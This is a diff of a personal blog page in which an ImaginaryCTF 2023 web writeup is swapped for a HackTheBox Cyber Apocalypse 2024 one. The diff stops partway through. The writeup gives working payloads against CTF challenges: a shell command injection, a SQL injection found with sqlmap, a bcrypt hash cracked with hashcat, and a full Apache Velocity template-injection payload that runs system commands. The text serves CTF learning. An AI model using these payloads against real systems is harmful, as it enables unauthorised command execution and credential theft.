@@ -1,26 +1,32 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='ImaginaryCTF Imaginaryctf web writeups  Idoriot This web challenge was very simple , while registering a new user you could set their id , so just set user_id as 0 and login to get the flag.
- Idoriot revenge This challenge is related to the first one but we can set the user id as a parameter , in the source , there is this filter
-1 2 3 4 5 6 7 8 9 10 11 12  if (isset($_GET[&amp;#39;user_id&amp;#39;])) { $user_id = (int) $_GET[&amp;#39;user_id&amp;#39;]; // Check if the user is admin  if ($user_id == &amp;#34;php&amp;#34; &amp;amp;&amp;amp; preg_match(&amp;#34;/&amp;#34;.'>
-<title>ImaginaryCTF2023</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='This is the writeup of HTB cyber apocalypse 2024 web challenges.
+I participated with my team &amp;ldquo;Gang de la Sinfonia&amp;rdquo;.
+Web Category  TimeKORP rating: very easy
+Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , from the source code it was running linux date command from that syntax.
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  &amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;command = &amp;#34;date &amp;#39;&#43;&amp;#34; .'>
+<title>HTB_cyberapocalypse_2024</title>
 
-<link rel='canonical' href='https://f0rk3b0mb.github.io/p/imaginaryctf2023/'>
+<link rel='canonical' href='https://f0rk3b0mb.github.io/p/htb_cyberapocalypse_2024/'>
 
-<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='ImaginaryCTF2023'>
-<meta property='og:description' content='ImaginaryCTF Imaginaryctf web writeups  Idoriot This web challenge was very simple , while registering a new user you could set their id , so just set user_id as 0 and login to get the flag.
- Idoriot revenge This challenge is related to the first one but we can set the user id as a parameter , in the source , there is this filter
-1 2 3 4 5 6 7 8 9 10 11 12  if (isset($_GET[&amp;#39;user_id&amp;#39;])) { $user_id = (int) $_GET[&amp;#39;user_id&amp;#39;]; // Check if the user is admin  if ($user_id == &amp;#34;php&amp;#34; &amp;amp;&amp;amp; preg_match(&amp;#34;/&amp;#34;.'>
-<meta property='og:url' content='https://f0rk3b0mb.github.io/p/imaginaryctf2023/'>
+<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='HTB_cyberapocalypse_2024'>
+<meta property='og:description' content='This is the writeup of HTB cyber apocalypse 2024 web challenges.
+I participated with my team &amp;ldquo;Gang de la Sinfonia&amp;rdquo;.
+Web Category  TimeKORP rating: very easy
+Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , from the source code it was running linux date command from that syntax.
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  &amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;command = &amp;#34;date &amp;#39;&#43;&amp;#34; .'>
+<meta property='og:url' content='https://f0rk3b0mb.github.io/p/htb_cyberapocalypse_2024/'>
 <meta property='og:site_name' content='f0rk3b0mb'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-07-23T12:41:18&#43;03:00'/><meta property='article:modified_time' content='2023-07-23T12:41:18&#43;03:00'/><meta property='og:image' content='https://f0rk3b0mb.github.io/cover/imaginary_ctf.jpg' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-03-11T13:23:40&#43;03:00'/><meta property='article:modified_time' content='2024-03-11T13:23:40&#43;03:00'/><meta property='og:image' content='https://f0rk3b0mb.github.io/cover/ca2024.png' />
 <meta name="twitter:site" content="@f0rk3b0mb">
-    <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="ImaginaryCTF2023">
-<meta name="twitter:description" content="ImaginaryCTF Imaginaryctf web writeups  Idoriot This web challenge was very simple , while registering a new user you could set their id , so just set user_id as 0 and login to get the flag.
- Idoriot revenge This challenge is related to the first one but we can set the user id as a parameter , in the source , there is this filter
-1 2 3 4 5 6 7 8 9 10 11 12  if (isset($_GET[&amp;#39;user_id&amp;#39;])) { $user_id = (int) $_GET[&amp;#39;user_id&amp;#39;]; // Check if the user is admin  if ($user_id == &amp;#34;php&amp;#34; &amp;amp;&amp;amp; preg_match(&amp;#34;/&amp;#34;."><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://f0rk3b0mb.github.io/cover/imaginary_ctf.jpg' />
+    <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="HTB_cyberapocalypse_2024">
+<meta name="twitter:description" content="This is the writeup of HTB cyber apocalypse 2024 web challenges.
+I participated with my team &amp;ldquo;Gang de la Sinfonia&amp;rdquo;.
+Web Category  TimeKORP rating: very easy
+Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , from the source code it was running linux date command from that syntax.
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  &amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;command = &amp;#34;date &amp;#39;&#43;&amp;#34; ."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://f0rk3b0mb.github.io/cover/ca2024.png' />
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-45FL0WGH80"></script>
 <script>
 var doNotTrack = false;
@@ -337,15 +343,14 @@ if (!doNotTrack) {
   <ol>
     <li>
       <ol>
-        <li><a href="#imaginaryctf">ImaginaryCTF</a>
+        <li><a href="#web-category">Web Category</a>
           <ol>
-            <li><a href="#imaginaryctf-web-writeups">Imaginaryctf web writeups</a></li>
-            <li><a href="#idoriot">Idoriot</a></li>
-            <li><a href="#idoriot-revenge">Idoriot revenge</a></li>
-            <li><a href="#blank">Blank</a></li>
-            <li><a href="#perfect-picture">Perfect picture</a></li>
-            <li><a href="#roks">Roks</a></li>
-            <li><a href="#login">Login</a></li>
+            <li><a href="#timekorp">TimeKORP</a></li>
+            <li><a href="#korp-terminal">KORP terminal</a></li>
+            <li><a href="#flag-command">Flag command</a></li>
+            <li><a href="#labrinth-linguist">Labrinth Linguist</a></li>
+            <li><a href="#locktalk">Locktalk</a></li>
+            <li><a href="#testimonial">Testimonial</a></li>
           </ol>
         </li>
       </ol>
@@ -364,9 +369,9 @@ if (!doNotTrack) {
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/imaginaryctf2023/">
+            <a href="/p/htb_cyberapocalypse_2024/">
                 
-                    <img src="/cover/imaginary_ctf.jpg" loading="lazy" alt="Featured image of post ImaginaryCTF2023" />
+                    <img src="/cover/ca2024.png" loading="lazy" alt="Featured image of post HTB_cyberapocalypse_2024" />
                 
             </a>
         </div>
@@ -385,7 +390,7 @@ if (!doNotTrack) {
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/imaginaryctf2023/">ImaginaryCTF2023</a>
+            <a href="/p/htb_cyberapocalypse_2024/">HTB_cyberapocalypse_2024</a>
         </h2>
     
         
@@ -407,7 +412,7 @@ if (!doNotTrack) {
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Jul 23, 2023</time>
+                <time class="article-time--published">Mar 11, 2024</time>
             </div>
         
 
@@ -422,7 +427,7 @@ if (!doNotTrack) {
 
 
                 <time class="article-time--reading">
-                    4 minute read
+                    5 minute read
                 </time>
             </div>
         
@@ -437,14 +442,13 @@ if (!doNotTrack) {
     <section class="article-content">
     
     
-    <h3 id="imaginaryctf">ImaginaryCTF</h3>
-<h4 id="imaginaryctf-web-writeups">Imaginaryctf web writeups</h4>
+    <p>This is the writeup of HTB cyber apocalypse 2024 web challenges.</p>
+<p>I participated with my team &ldquo;Gang de la Sinfonia&rdquo;.</p>
+<h3 id="web-category">Web Category</h3>
 <hr>
-<h4 id="idoriot">Idoriot</h4>
-<p>This web challenge was very simple , while registering a new user you could set their id  , so just set user_id as 0 and login to get the flag.</p>
-<hr>
-<h4 id="idoriot-revenge">Idoriot revenge</h4>
-<p>This challenge is related to the first one but we can set the user id as a parameter , in the source , there is this filter</p>
+<h4 id="timekorp">TimeKORP</h4>
+<p>rating: very easy</p>
+<p>Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , from the source code it was running linux date command from that syntax.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -459,26 +463,41 @@ if (!doNotTrack) {
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php">
-<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$user_id</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">];</span>
-    <span class="c1">// Check if the user is admin
-</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$user_id</span> <span class="o">==</span> <span class="s2">&#34;php&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$admin</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="c1">// Read the flag from flag.txt
-</span><span class="c1"></span>        <span class="nv">$flag</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/flag.txt&#39;</span><span class="p">);</span>
-        <span class="k">echo</span> <span class="s2">&#34;&lt;h1&gt;Flag&lt;/h1&gt;&#34;</span><span class="p">;</span>
-        <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt;</span><span class="si">$flag</span><span class="s2">&lt;/p&gt;&#34;</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+class TimeModel
+{
+    public function __construct($format)
+    {
+        $this-&gt;command = &#34;date &#39;+&#34; . $format . &#34;&#39; 2&gt;&amp;1&#34;;
+    }
+
+    public function getTime()
+    {
+        $time = exec($this-&gt;command);
+        $res  = isset($time) ? $time : &#39;?&#39;;
+        return $res;
+    }
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>This is classic command injection.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">payload :    %H:%M:%D&#39;;cat flag.txt
 
 </code></pre></td></tr></table>
 </div>
-</div><p>it checks if the user_id is equal to &ldquo;php&rdquo; and if the username contains &ldquo;admin&rdquo;.</p>
-<p>This is classic php type juggling read more &raquo; <a class="link" href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf"  target="_blank" rel="noopener"
-    >here</a>  there is also a chart on the pdf showing what will be regerded as True or False in php, in this case if i set user_id=0  it will be equal to &ldquo;php&rdquo;. For the username , register any user with a username that contains &ldquo;admin&rdquo; but not &ldquo;admin&rdquo; like eg (admino) to satisfy the regex check.</p>
-<p><img src="/images/ImaCTF2023/idoriot_revenge.png"
+</div><p>flag: HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}</p>
+<p><img src="/images/ca2024/cmd.png"
 	
 	
 	
@@ -489,66 +508,50 @@ if (!doNotTrack) {
 	
 ></p>
 <hr>
-<h4 id="blank">Blank</h4>
-<p>This challenge tested knowledge is sql.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js">
-<span class="nx">db</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM users WHERE username = &#34;&#39;</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s1">&#39;&#34; and password = &#34;&#39;</span> <span class="o">+</span> <span class="nx">password</span><span class="o">+</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">row</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-
-</code></pre></td></tr></table>
-</div>
-</div><p>as you can see , user input is directly added to the sql statement which is very dangerous. Also the application was not checking the password.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-  <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Welcome admin. The flag is &#39;</span> <span class="o">+</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">));</span>
-  <span class="p">}</span>
-
-</code></pre></td></tr></table>
-</div>
-</div><p>THe username had to be &ldquo;admin&rdquo;. so we can only inject via password field</p>
-<p><img src="/images/ImaCTF2023/blank_payload.png"
+<h4 id="korp-terminal">KORP terminal</h4>
+<p>rating: very easy</p>
+<p>For this challnge you are provided with a login page that requires a username and password. So it has to be login bypass.</p>
+<p>Given the rating of this challenge just throw sqlmap at it. You can also confirm this by using a single quote ,it return a sql error.</p>
+<p>Output from slqmap</p>
+<p><img src="/images/ca2024/sqlmap.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="payload"
+		alt="sqlmap"
 	
 	
 ></p>
-<p>This will satisfy this part of the code and return rows</p>
+<p>From this we get a user admin and the password hash.</p>
 <div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">admin: $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.
+
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
-</span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="k">if</span> <span class="p">(</span><span class="nx">row</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">row</span><span class="p">,</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span><span class="p">);</span>
-        <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">loggedIn</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
-        <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="nx">username</span><span class="p">;</span>
-        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Login successful!&#39;</span><span class="p">);</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">hashcat -m 3200 hashcat.txt /usr/share/wordlists/rockyou.txt
+
+$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
+
 </code></pre></td></tr></table>
 </div>
-</div><p><img src="/images/ImaCTF2023/blank.png"
+</div><p>Cracking the password using hashcat we get the password : password123</p>
+<p>We can then login to get the flag</p>
+<p>flag: HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}</p>
+<p><img src="/images/ca2024/login.png"
 	
 	
 	
@@ -559,8 +562,59 @@ if (!doNotTrack) {
 	
 ></p>
 <hr>
-<h4 id="perfect-picture">Perfect picture</h4>
-<p>This challenge required uploading a picture with specific characterictics</p>
+<h4 id="flag-command">Flag command</h4>
+<p>rating: very easy</p>
+<p>Here we are given an applicating that requires a bunch of commands to navigate a puzzle. When you intercept the traffic using burp you will see an endpoint with a  list of the commands.</p>
+<p><img src="/images/ca2024/options.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="flag"
+	
+	
+></p>
+<p>Here we can see a secret command. Using it&hellip;</p>
+<p>flag: HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!}</p>
+<p><img src="/images/ca2024/flag_command.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="flag"
+	
+	
+></p>
+<hr>
+<h4 id="labrinth-linguist">Labrinth Linguist</h4>
+<p>rating: easy</p>
+<p>Here we are given a webapp that translates text that we give it.</p>
+<p>Oooooh its a java application. I wasnt expecting thsi to be straight forward. But &hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">String template = &#34;&#34;;
+
+        try {
+            template = readFileToString(&#34;/app/src/main/resources/templates/index.html&#34;, textString);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+</code></pre></td></tr></table>
+</div>
+</div><p>Our input was being used in a template. This is dangerous if no filters are applied. I quickly googled SSTI in java (Server Side Template Injection) payloads. Got this &raquo; <a class="link" href="https://iwconnect.com/apache-velocity-server-side-template-injection/"  target="_blank" rel="noopener"
+    >here</a> .</p>
+<p>From here we can execute commands and cat the flag. Credits to Anshul for doing this. I had a problem using the payload in burp suite due to the newlines.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -588,100 +642,38 @@ if (!doNotTrack) {
 </span><span class="lnt">23
 </span><span class="lnt">24
 </span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">
-<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">uploaded_image</span><span class="p">):</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-        <span class="n">flag</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-    <span class="k">with</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_FOLDER&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">uploaded_image</span><span class="p">)</span> <span class="k">as</span> <span class="n">image</span><span class="p">:</span>
-        <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="n">size</span>
-        <span class="k">if</span> <span class="n">w</span> <span class="o">!=</span> <span class="mi">690</span> <span class="ow">or</span> <span class="n">h</span> <span class="o">!=</span> <span class="mi">420</span><span class="p">:</span>
-            <span class="k">return</span> <span class="mi">0</span>
-        <span class="k">if</span> <span class="n">image</span><span class="o">.</span><span class="n">getpixel</span><span class="p">((</span><span class="mi">412</span><span class="p">,</span> <span class="mi">309</span><span class="p">))</span> <span class="o">!=</span> <span class="p">(</span><span class="mi">52</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">235</span><span class="p">,</span> <span class="mi">123</span><span class="p">):</span>
-            <span class="k">return</span> <span class="mi">0</span>
-        <span class="k">if</span> <span class="n">image</span><span class="o">.</span><span class="n">getpixel</span><span class="p">((</span><span class="mi">12</span><span class="p">,</span> <span class="mi">209</span><span class="p">))</span> <span class="o">!=</span> <span class="p">(</span><span class="mi">42</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">231</span><span class="p">):</span>
-            <span class="k">return</span> <span class="mi">0</span>
-        <span class="k">if</span> <span class="n">image</span><span class="o">.</span><span class="n">getpixel</span><span class="p">((</span><span class="mi">264</span><span class="p">,</span> <span class="mi">143</span><span class="p">))</span> <span class="o">!=</span> <span class="p">(</span><span class="mi">122</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">213</span><span class="p">):</span>
-            <span class="k">return</span> <span class="mi">0</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">#set($s=&#34;&#34;)
+            #set($stringClass=$s.getClass())
+            #set($stringBuilderClass=$stringClass.forName(&#34;java.lang.StringBuilder&#34;))
+            #set($inputStreamClass=$stringClass.forName(&#34;java.io.InputStream&#34;))
+            #set($readerClass=$stringClass.forName(&#34;java.io.Reader&#34;))
+            #set($inputStreamReaderClass=$stringClass.forName(&#34;java.io.InputStreamReader&#34;))
+            #set($bufferedReaderClass=$stringClass.forName(&#34;java.io.BufferedReader&#34;))
+            #set($collectorsClass=$stringClass.forName(&#34;java.util.stream.Collectors&#34;))
+            #set($systemClass=$stringClass.forName(&#34;java.lang.System&#34;))
+            #set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
+            #set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
+            #set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))
 
-    <span class="k">with</span> <span class="n">exiftool</span><span class="o">.</span><span class="n">ExifToolHelper</span><span class="p">()</span> <span class="k">as</span> <span class="n">et</span><span class="p">:</span>
-        <span class="n">metadata</span> <span class="o">=</span> <span class="n">et</span><span class="o">.</span><span class="n">get_metadata</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_FOLDER&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">uploaded_image</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
-        <span class="k">try</span><span class="p">:</span>
-            <span class="k">if</span> <span class="n">metadata</span><span class="p">[</span><span class="s2">&#34;PNG:Description&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;jctf</span><span class="si">{not_the_flag}</span><span class="s2">&#34;</span><span class="p">:</span>
-                <span class="k">return</span> <span class="mi">0</span>
-            <span class="k">if</span> <span class="n">metadata</span><span class="p">[</span><span class="s2">&#34;PNG:Title&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;kool_pic&#34;</span><span class="p">:</span>
-                <span class="k">return</span> <span class="mi">0</span>
-            <span class="k">if</span> <span class="n">metadata</span><span class="p">[</span><span class="s2">&#34;PNG:Author&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;anon&#34;</span><span class="p">:</span>
-                <span class="k">return</span> <span class="mi">0</span>
-        <span class="k">except</span><span class="p">:</span>
-            <span class="k">return</span> <span class="mi">0</span>
-    <span class="k">return</span> <span class="n">flag</span>
+            #set($runtime=$stringClass.forName(&#34;java.lang.Runtime&#34;).getRuntime())
+            #set($process=$runtime.exec(&#34;cat ../flag2023911480.txt&#34;))
+            #set($null=$process.waitFor() )
 
+            #set($inputStream=$process.getInputStream())
+            #set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
+            #set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
+            #set($stringBuilder=$stringBuilderConstructor.newInstance())
+
+            #set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))
+
+            $output
 </code></pre></td></tr></table>
 </div>
-</div><p>to satisfy those i wrote a python script</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">
-<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
-
-<span class="k">def</span> <span class="nf">create_and_modify_image</span><span class="p">():</span>
-    <span class="c1"># Step 1: Create the Image</span>
-    <span class="n">width</span><span class="p">,</span> <span class="n">height</span> <span class="o">=</span> <span class="mi">690</span><span class="p">,</span> <span class="mi">420</span>
-    <span class="n">image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&#34;RGBA&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">width</span><span class="p">,</span> <span class="n">height</span><span class="p">),</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
-
-    <span class="c1"># Step 2: Modify Pixel Colors</span>
-    <span class="n">image</span><span class="o">.</span><span class="n">putpixel</span><span class="p">((</span><span class="mi">412</span><span class="p">,</span> <span class="mi">309</span><span class="p">),</span> <span class="p">(</span><span class="mi">52</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">235</span><span class="p">,</span> <span class="mi">123</span><span class="p">))</span>
-    <span class="n">image</span><span class="o">.</span><span class="n">putpixel</span><span class="p">((</span><span class="mi">12</span><span class="p">,</span> <span class="mi">209</span><span class="p">),</span> <span class="p">(</span><span class="mi">42</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">231</span><span class="p">))</span>
-    <span class="n">image</span><span class="o">.</span><span class="n">putpixel</span><span class="p">((</span><span class="mi">264</span><span class="p">,</span> <span class="mi">143</span><span class="p">),</span> <span class="p">(</span><span class="mi">122</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">213</span><span class="p">))</span>
-    <span class="c1"># Step 3: Save the Image</span>
-    <span class="n">image</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s2">&#34;created_image.png&#34;</span><span class="p">)</span>
-
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-    <span class="n">create_and_modify_image</span><span class="p">()</span>
-
-</code></pre></td></tr></table>
-</div>
-</div><p>you also have to run  the following command to set the exit data</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
-exiftool -PNG:Description<span class="o">=</span><span class="s2">&#34;jctf{not_the_flag}&#34;</span> -PNG:Title<span class="o">=</span><span class="s2">&#34;kool_pic&#34;</span> -PNG:Author<span class="o">=</span><span class="s2">&#34;anon&#34;</span> created_image.png
-
-</code></pre></td></tr></table>
-</div>
-</div><p><img src="/images/ImaCTF2023/picture_perfect.png"
+</div><p>Just use the payload in the browser and capture the request in burp.</p>
+<p>flag : HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}</p>
+<p><img src="/images/ca2024/ssti.png"
 	
 	
 	
@@ -692,53 +684,11 @@ exiftool -PNG:Description<span class="o">=</span><span class="s2">&#34;jctf{not_
 	
 ></p>
 <hr>
-<h4 id="roks">Roks</h4>
-<p>This challenge was obviously an lfi</p>
